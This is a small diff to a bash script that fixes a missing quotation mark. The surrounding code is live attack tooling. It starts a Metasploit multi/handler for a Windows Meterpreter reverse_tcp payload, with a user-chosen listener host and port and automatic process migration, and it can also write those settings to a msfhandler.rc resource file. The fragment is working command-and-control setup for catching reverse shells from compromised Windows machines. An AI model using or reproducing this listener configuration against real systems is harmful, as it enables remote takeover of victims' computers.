@@ -137,7 +137,7 @@ if [ "$select" = "1" ]; then
   msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; set autorunscript post/windows/manage/migrate; exploit -j;"
 elif [ "$select" = "2" ]; then
   echo ""
-  echo "Use msfhandler.rc as msfconsole resource on your listener system
+  echo "Use msfhandler.rc as msfconsole resource on your listener system"
   echo "use exploit/multi/handler" >> msfhandler.rc
   echo "set payload windows/meterpreter/reverse_tcp" >> msfhandler.rc
   echo "set LHOST $lhost" >> msfhandler.rc
